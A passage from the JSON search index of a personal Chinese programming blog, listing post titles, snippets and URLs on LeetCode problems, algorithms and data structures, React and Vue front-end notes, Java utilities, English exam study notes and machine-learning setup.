8","lvl0":"不含连续1的非负整数","lvl1":null,"lvl2":"摘要","objectID":"8279f335b77a8c5459d0e08cbd65a268","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%95%B0%E4%BD%8Ddp%E4%BE%8B%E9%A2%98/leetcode600_%E4%B8%8D%E5%90%AB%E8%BF%9E%E7%BB%AD1%E7%9A%84%E9%9D%9E%E8%B4%9F%E6%95%B4%E6%95%B0/"},{"content":"1960. 两个回文子字符串长度的最大乘积 Difficulty: 困难 给你一个下标从 0 开始的字符串 s ，你需要找到两个 **不重叠****的回文 **子字符串，它们的长度都必须为","lvl0":"两个回文子字符串长度的最大乘积","lvl1":null,"lvl2":"摘要","objectID":"bbf3b65538373a07a4a3ac0b1cf7056e","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%9B%9E%E6%96%87/lc1960.%E4%B8%A4%E4%B8%AA%E5%9B%9E%E6%96%87%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E6%9C%80%E5%A4%A7%E4%B9%98%E7%A7%AF/"},{"content":"152. 乘积最大子数组 Difficulty: 中等 给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。 示例","lvl0":"乘积最大的子数组","lvl1":null,"lvl2":"摘要","objectID":"be5ffa67aa7ade6e954fb9c70e5c3c9f","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E4%B9%98%E7%A7%AF%E6%9C%80%E5%A4%A7%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/"},{"content":"二叉树的遍历 前序遍历 1 2 3 4 5 6 7 8 9 10 11 12 public List\u0026lt;Integer\u0026gt; ans = new ArrayList\u0026lt;\u0026gt;(); public List\u0026lt;Integer\u0026gt; preorderTraversal(TreeNode root){ preorder(root); return ans; } public void preorder(TreeNode node) { if(node == null) return; ans.add(node.val); preorder(node.left); preorder(node.right); } 中序遍历 1 2 3 4 5 6 7 8 9 10 11 12 public List\u0026lt;Integer\u0026gt; ans = new","lvl0":"二叉树遍历","lvl1":null,"lvl2":"摘要","objectID":"5e90a6d2f8c3f9f2b6559a0c875df162","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"},{"content":"使用swal alert 弹框组件 1 2 npm install sweetalert --save y 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import swal from \u0026#39;sweetalert\u0026#39;; swal({ title: \u0026#34;Are you sure?\u0026#34;, text: \u0026#34;Once deleted, you will not be able to recover this imaginary file!\u0026#34;, icon: \u0026#34;warning\u0026#34;, buttons: true, dangerMode: true, }) .then((willDelete) =\u0026gt; { if (willDelete) {","lvl0":"使用 swal alert 弹框组件","lvl1":null,"lvl2":"摘要","objectID":"390ecd926089a4075e4b06ff8bb82c02","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/swal-alert-%E5%BC%B9%E6%A1%86%E7%BB%84%E4%BB%B6/"},{"content":"react 使用 ace.js 1 yarn add react-ace 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62","lvl0":"使用ace.js","lvl1":null,"lvl2":"摘要","objectID":"6b0245bf7ef3c3d03e55b75c5e4c5b5b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/react%E4%BD%BF%E7%94%A8ace.js/"},{"content":"学习视频 参考路由配置 官网文档 监听路由跳转 ，修改 title 参考学习视频","lvl0":"修改路由配置","lvl1":null,"lvl2":"摘要","objectID":"a1616d0e73e8dba528bcc244665ad74e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/%E4%BF%AE%E6%94%B9%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; permuteUnique(vector\u0026lt;int\u0026gt;\u0026amp; nums) { sort(nums.begin(),nums.end()); s = nums; visited = vector\u0026lt;bool\u0026gt; (s.size(),false); dfs(0); return res; } vector\u0026lt;int\u0026gt; s; vector\u0026lt;int\u0026gt; path; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; vector\u0026lt;bool\u0026gt; visited; void dfs(int cur) { if(path.size() \u0026gt;= s.size()) {","lvl0":"全排列算法","lvl1":null,"lvl2":"摘要","objectID":"487c65fd528a5b7e9d33d6f0a6b945da","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%85%A8%E6%8E%92%E5%88%97%E7%AE%97%E6%B3%95/"},{"content":"写作笔记 [TOC] 练习知识-定语从句 名称定语： a taxi driver , education equality 形容词定语 a beautiful girl / rural schools 介词定语： a man on the street 定语从句： a woman who is standing on the street. 现在分词 a woman standing on the street. 过","lvl0":"六级考试-写作","lvl1":null,"lvl2":"摘要","objectID":"b5d4fa3e1f14f7d086abba12a0fa2b5b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%85%AD%E7%BA%A7%E8%80%83%E8%AF%95/%E5%86%99%E4%BD%9C/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70","lvl0":"切面异常处理","lvl1":null,"lvl2":"摘要","objectID":"e89a2ab258c6a6fe27069762f228b8d4","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%88%87%E9%9D%A2%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"content":"前端table表格展示 参考视频 自定义表格 项","lvl0":"前端 table表格展示","lvl1":null,"lvl2":"摘要","objectID":"874899e73a98df32ebd75608df4eccd7","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/table%E8%A1%A8%E6%A0%BC%E5%B1%95%E7%A4%BA/"},{"content":"单例懒加载的实现方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package io.github.lyr2000.dissertation.util; import cn.hutool.crypto.SecureUtil; import cn.hutool.crypto.symmetric.AES; /** *","lvl0":"单例懒加载的实现方式","lvl1":null,"lvl2":"摘要","objectID":"8c1654c52ad8d2cc15881217f2cba892","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%8D%95%E4%BE%8B%E6%87%92%E5%8A%A0%E8%BD%BD/"},{"content":"","lvl0":"博客搭建_添加看板娘","lvl1":null,"lvl2":"摘要","objectID":"0133998045b179c2d0d6807e66ae39a6","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%8D%9A%E5%AE%A2%E5%8A%A0%E5%85%A5%E7%9C%8B%E6%9D%BF%E5%A8%98/"},{"content":"文章发布功能_ 7分钟开始学 react hooks 使用学习 button组件传值 - 18分钟","lvl0":"参考项目","lvl1":null,"lvl2":"摘要","objectID":"18ce9089526917ebef748bbb350c943a","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/%E6%96%87%E7%AB%A0%E5%8F%91%E5%B8%83%E5%8A%9F%E8%83%BD/"},{"content":"15. 三数之和 Difficulty: 中等 给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 _a，b，c ，_使得 a + b + c = 0 ？请你找出所有和为 0 且不重复的","lvl0":"双指针算法","lvl1":null,"lvl2":"摘要","objectID":"7c4ba21e946de5b363ea12630c7ff1cd","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import axios from \u0026#34;axios\u0026#34;; import {message} from \u0026#39;antd\u0026#39; axios.defaults.baseURL=\u0026#39;http://localhost:8081/\u0026#39; const getToken = ()=\u0026gt; { let token = sessionStorage.getItem(\u0026#39;token\u0026#39;) return token||\u0026#34;\u0026#34;; } axios.defaults.headers.common[\u0026#39;token\u0026#39;]","lvl0":"基本模板","lvl1":null,"lvl2":"摘要","objectID":"9dbe0a5634d6d28f52475a139ea2035d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%A8%A1%E6%9D%BF/"},{"content":"一些学校连接在一个计算机网络上，学校之间存在软件支援协议，每个学校都有它应支援的学校名单（学校 A 支援学校 B，并不表示学校 B 一定要支援学校 A）","lvl0":"学校网络","lvl1":null,"lvl2":"摘要","objectID":"145b46af8e4d8f234497bb72b945ab79","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%9B%BE%E8%AE%BA%E9%97%AE%E9%A2%98/tarjan%E7%AE%97%E6%B3%95%E4%BE%8B%E9%A2%98/%E5%AD%A6%E6%A0%A1%E7%BD%91%E7%BB%9C/"},{"content":"1456. 定长子串中元音的最大数目 Difficulty: 中等 给你字符串 s 和整数 k 。 请返回字符串 s 中长度为 k 的单个子字符串中可能包含的最大元音字母数。 英文中的 元音字母 为（","lvl0":"定长子串中元音的最大数目","lvl1":null,"lvl2":"摘要","objectID":"36e4c206e5b39c6d1f19a171b660cc63","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E4%BC%98%E5%8C%96/lc.1456.%E5%AE%9A%E9%95%BF%E5%AD%90%E4%B8%B2%E4%B8%AD%E5%85%83%E9%9F%B3%E4%B8%AA%E6%9C%80%E5%A4%A7%E6%95%B0%E7%9B%AE/"},{"content":"每一头牛的愿望就是变成一头最受欢迎的牛。 现在有 N 头牛，编号从 1 到 N ，给你 M 对整数 (A,B) ，表示牛 A 认为牛 B 受欢迎。 这种关系是具有传递性的，如果 A 认","lvl0":"强连通分量_受欢迎的牛","lvl1":null,"lvl2":"摘要","objectID":"662cc9560c23ac68a9e2e450d7bb5f71","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%9B%BE%E8%AE%BA%E9%97%AE%E9%A2%98/tarjan%E7%AE%97%E6%B3%95%E4%BE%8B%E9%A2%98/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F_%E5%8F%97%E6%AC%A2%E8%BF%8E%E7%9A%84%E7%89%9B/"},{"content":"句子 The great financial crash in 1929 ruined international trade. will you be able to cure him,Doctor? A welcoming fire was burning in the fireplace. we are deficient in hands 我们人手不够 He made outstanding contributions to the field of science. 他对科学领域作出了卓越的贡献。 You may be in danger if you exceed the","lvl0":"必背句子","lvl1":null,"lvl2":"摘要","objectID":"4e98a9984720f5f1a466aef865fbdd1e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%85%AD%E7%BA%A7%E8%80%83%E8%AF%95/%E5%BF%85%E8%83%8C%E7%9A%84%E5%8F%A5%E5%AD%90/"},{"content":"抽屉效果实现 参考视频","lvl0":"抽屉效果实现","lvl1":null,"lvl2":"摘要","objectID":"2da3587ef14e66fbab33637c2a680799","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/%E6%8A%BD%E5%B1%89%E6%95%88%E6%9E%9C%E5%AE%9E%E7%8E%B0%E5%8F%B3%E4%BE%A7%E6%8A%BD%E5%B1%89/"},{"content":"1389. 按既定顺序创建目标数组 Difficulty: 简单 给你两个整数数组 nums 和 index。你需要按照以下规则创建目标数组： 目标数组 target 最初为空。 按从左到右的顺序依次读取 nums[i]","lvl0":"按既定顺序创建目标数组","lvl1":null,"lvl2":"摘要","objectID":"e1eb544c9afc04040304d1445a6ea3e4","tags":["算法学习"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%8E%92%E5%BA%8F%E4%B8%93%E9%A2%98/lc.1389%E6%8C%89%E6%97%A2%E5%AE%9A%E9%A1%BA%E5%BA%8F%E5%88%9B%E5%BB%BA%E7%9B%AE%E6%A0%87%E6%95%B0%E7%BB%84/"},{"content":"按钮开关同步数据","lvl0":"按钮开关同步数据","lvl1":null,"lvl2":"摘要","objectID":"92f570460ef89722cfd6ad1f9b0d7b35","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/antd%E4%BD%BF%E7%94%A8/%E6%8C%89%E9%92%AE%E5%BC%80%E5%85%B3%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE/"},{"content":"数位dp 算法模板 学习视频 核心算法原理 参数解释 可选参数： pre:表示上一个数是多少 有些题目会用到前面的数 lead :前导零是否存在，lead=1存在前","lvl0":"数位DP 算法","lvl1":null,"lvl2":"摘要","objectID":"be89a8170c86e264a7fb65fd8cb6e21d","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%95%B0%E4%BD%8Ddp%E7%AE%97%E6%B3%95/"},{"content":"1012. 至少有 1 位重复的数字 Difficulty: 困难 给定正整数 N，返回小于等于 N 且具有至少 1 位重复数字的正整数的个数。 示例 1： 1 2 3 输入：20 输出：1 解释：具有至少","lvl0":"数位DP例题_阅文笔试题_ lc1012","lvl1":null,"lvl2":"摘要","objectID":"001bb264f1a2557e3ce7a9dfa9c03d63","tags":["数位DP","hard"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%95%B0%E4%BD%8Ddp%E4%BE%8B%E9%A2%98/lc1012.%E8%87%B3%E5%B0%911%E4%BD%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"八大排序以及java实现 插入排序 算法描述 一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下： 从第一个元素开始，该元素可以","lvl0":"数据结构_八大排序【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"5df1953bd74d3f25cdadafb7277fa907","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F%E4%BB%A5%E5%8F%8Ajava%E5%AE%9E%E7%8E%B0/"},{"content":"#跳表 什么是跳表 多层的有序链表，越上层，节点数越少 跳表如何查询 从最上面那层开始，从左往右遍历，直到下一个节点比要查询的值大，往下一层走。循环","lvl0":"数据结构_跳表【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"644a3ffe01aa5ca6e28154290173271d","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E8%B7%B3%E8%A1%A8/"},{"content":"数据结构合集 https://blog.csdn.net/cywosp/article/details/23397179 https://blog.csdn.net/qq_43621789/article/details/106917404 一致性哈希算法 哈希算法好坏的定义 1、平衡性(Balance)：平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使","lvl0":"数据结构集合【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"f577e689ae88eda1d2004a50a85a6e97","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%9B%86%E5%90%88/"},{"content":"文件秒传的实现方法 参考的博客 csdn 博客 文件的常用校验算法 CRC(32/64) MD5 SHA1 文件秒传的应用场景 用户上传 离线下载 好友分享 关键点： 文件 Hash(MD5,SHA1等","lvl0":"文件秒传实现","lvl1":null,"lvl2":"摘要","objectID":"612a5c15cbc57e8b264930b0f158215f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E6%96%87%E4%BB%B6%E7%A7%92%E4%BC%A0%E5%AE%9E%E7%8E%B0/"},{"content":"实现的代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 const InnerTable = ({ history }) =\u0026gt; { //更新权限 updatePermission({ permissionId:currentId, pathKey:permissionKey, permissionName }).then(( {code}) =\u0026gt; { if(code ==200) { message.info(\u0026#","lvl0":"更新数据手动刷新页面","lvl1":null,"lvl2":"摘要","objectID":"007746b4a0172ecd8b41fab6181e1929","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E6%89%8B%E5%8A%A8%E5%88%B7%E6%96%B0%E9%A1%B5%E9%9D%A2%E6%96%B9%E6%A1%88/"},{"content":"给定一个长度为 n 的正整数数列 $ a_1,a_2,…,a_n $ 。 初始时，数列中的每个元素要么处于可选状态，要么处于不可选状态。 你可以选择一个长度","lvl0":"最大的和","lvl1":null,"lvl2":"摘要","objectID":"db46f950e3ca49713dfe50a8ac006c2e","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%B7%AE%E5%88%86%E5%89%8D%E7%BC%80%E5%92%8C/%E6%9C%80%E5%A4%A7%E7%9A%84%E5%92%8C/"},{"content":"基本概念 开发环境准备 virtualenv 1 2 3 4 5 6 7 8 9 pip install virtualenv virtualenv venv_tensorflow cd ven_tensorflow cd Scripts ./activate # 激活命令后 ，再安装 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ --upgrade tensorflow 参考学习视频 https://www.imooc.com/video/21017 参考黑马的学习视频 https://www.bilibili.com/video/BV17y4y1m737?from=search\u0026amp;seid=15321442391462308172\u0026amp;spm_id_from=333.337.0.0 理论课程： https://www.bilibili.com/video/BV1hM4y157xX?from=search\u0026amp;seid=15321442391462308172\u0026amp;spm_id_from=333.337.0.0 NLP","lvl0":"机器学习基本概念","lvl1":null,"lvl2":"摘要","objectID":"e30eacdd5d9432487518d7a3908141f7","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/nlp/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/"},{"content":"权限列表 数据表格 参考学习视频 - 4分钟 5分钟 可以看操作 operation 按钮 看11分钟 ，表格 overflow 处理方法 数据删除 confirm 参考视频-2分钟 参考视频 - 22分钟 更新数据 参考","lvl0":"权限列表【数据表格_ 数据展示】","lvl1":null,"lvl2":"摘要","objectID":"54c658c6524a3f9f83c5a5ac3652d9de","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/antd%E4%BD%BF%E7%94%A8/%E6%9D%83%E9%99%90%E5%88%97%E8%A1%A8/"},{"content":"已知 11 年 11 月 11 日是星期一。 现在给定一个日期，请你判断是星期几。 注意闰年的 22 月有 2929 天。 满足下面条件之一的是闰年： 年份是 44 的整数倍，而且不是 100100 的","lvl0":"枚举_日期类题","lvl1":null,"lvl2":"摘要","objectID":"7d27931704f8084ce4ede94e81c2e0d0","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%9E%9A%E4%B8%BE_%E6%97%A5%E6%9C%9F%E7%B1%BB%E9%A2%98/"},{"content":"有 nn 头奶牛，已知它们的身高为 1∼n1∼n 且各不相同，但不知道每头奶牛的具体身高。 现在这 nn 头奶牛站成一列，已知第 ii 头牛前面有 AiAi 头牛比它低，求每","lvl0":"树状数组算法","lvl1":null,"lvl2":"摘要","objectID":"881d5a28333804d5a6c60c993889f364","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"content":"","lvl0":"格式化sql工具总结","lvl1":null,"lvl2":"摘要","objectID":"87b036e537b9fff3849053b85336add6","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/idea%E5%B7%A5%E5%85%B7/%E6%A0%BC%E5%BC%8F%E5%8C%96sql%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/"},{"content":"模拟退火算法 入门 介绍模拟退火前，先介绍爬山算法。爬山算法是一种简单的贪心搜索算法，该算法每次从当前解的临近解空间中选择一个最优解作为当前解，","lvl0":"模拟退火算法","lvl1":null,"lvl2":"摘要","objectID":"d6fec80535a90c7682c7832a986f98c7","tags":["算法学习"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB%E7%AE%97%E6%B3%95/"},{"content":"抗压是能力 亦或是习惯 Working Under Pressure, a Skill or an Effect of Desensitization? Nowadays, if you\u0026rsquo;re good at working under pressure, you\u0026rsquo;re usually highly valued in the workplace. Furthermore, the labor market evolves at an alarming rate. It\u0026rsquo;s also highly likely that in a few years\u0026rsquo; time, the jobs we know today will probably have completely changed or disappeared. This all ==adds to","lvl0":"每日阅读-21/11/13","lvl1":null,"lvl2":"摘要","objectID":"832161375716a67789f0e91f12274e2f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%85%AD%E7%BA%A7%E8%80%83%E8%AF%95/%E6%AF%8F%E6%97%A5%E9%98%85%E8%AF%BB21-11-13/"},{"content":"布隆过滤器 golang 爬虫项目使用 开源的布隆过滤器 参考项目 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46","lvl0":"爬虫使用布隆过滤器","lvl1":null,"lvl2":"摘要","objectID":"9743996e19a74c38e77a84125154e52d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE%E4%BD%BF%E7%94%A8/"},{"content":"神经网络原理 学习教程 人工智能分三类： 自上而下的符号主义 基于逻辑学 自下而上的连接主义（即神经网络） 基于仿生学 还有个机器学习，基于进化论 训练学习","lvl0":"神经网络原理","lvl1":null,"lvl2":"摘要","objectID":"0b7d6d34379cd9458c76f6ebba908d4b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/"},{"content":"446. 等差数列划分 II - 子序列 Difficulty: 困难 给你一个整数数组 nums ，返回 nums 中所有 等差子序列 的数目。 如果一个序列中 至少有三个元素 ，并且任意两个相邻元素之差相同，","lvl0":"等差数列划分 II 